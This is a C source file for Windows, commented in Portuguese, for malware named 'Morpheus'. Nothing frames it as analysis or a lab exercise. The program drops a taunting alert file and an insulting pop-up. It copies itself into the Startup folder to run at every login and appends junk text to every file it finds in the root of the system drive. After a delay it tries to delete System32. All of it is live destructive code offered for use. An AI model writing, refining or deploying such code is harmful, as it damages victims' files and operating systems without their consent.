#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>

// Função para criar um arquivo de alerta
void create_alert_file() {
    FILE *file;
    char desktop[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop);
    strcat(desktop, "\\ALERTA_MORPHEUS.txt");

    file = fopen(desktop, "w");
    if (file != NULL) {
        fprintf(file, "Seu computador foi infectado pelo malware Morpheus!\nHACKED BY PHOENIX");
        fclose(file);
        printf("Arquivo de alerta criado: %s\n", desktop);
    } else {
        printf("Erro ao criar arquivo de alerta.\n");
    }
}

// Função para mostrar mensagem pop-up
void show_popup() {
    MessageBox(NULL, "Seu computador foi infectado pelo malware Morpheus! Parabéns por ser tão idiota!", "Alerta de Infecção", MB_OK);
}

// Função para garantir execução automática no Windows
void ensure_auto_execution(char *path) {
    char startup[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startup);
    strcat(startup, "\\Morpheus.exe");

    if (CopyFile(path, startup, FALSE)) {
        printf("Configuração de execução automática adicionada.\n");
    } else {
        printf("Erro ao configurar execução automática.\n");
    }
}

// Função para infectar e corromper arquivos em um diretório
void infect_and_corrupt_files(char *directory) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(strcat(directory, "\\*"), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Erro ao abrir diretório: %s\n", directory);
        return;
    } 

    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Ignora diretórios "." e ".."
            if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
                continue;
            }
        } else {
            char filePath[MAX_PATH];
            sprintf(filePath, "%s\\%s", directory, findFileData.cFileName);
            FILE *file = fopen(filePath, "a");
            if (file != NULL) {
                fprintf(file, "\n# Arquivo infectado e corrompido por Morpheus\nHACKED BY PHOENIX\n");
                fclose(file);
                printf("Corrompido: %s\n", filePath);
            } else {
                printf("Erro ao corromper: %s\n", filePath);
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// Função para deletar System32
void delete_system32() {
    char system32[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, 0, system32);

    if (RemoveDirectory(system32)) {
        printf("System32 deletado!\n");
    } else {
        printf("Erro ao deletar System32.\n");
    }
}

int main() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    // Criar arquivo de alerta
    create_alert_file();

    // Mostrar mensagem pop-up
    show_popup();

    // Garantir execução automática
    ensure_auto_execution(path);

    // Infecta e corrompe arquivos no diretório alvo
    char directory[MAX_PATH];
    GetEnvironmentVariable("SystemDrive", directory, MAX_PATH);
    infect_and_corrupt_files(directory);

    // Espera 5 minutos (300 segundos) antes de tentar deletar System32
    Sleep(300000);

    // Deletar System32
    delete_system32();

    return 0;
}
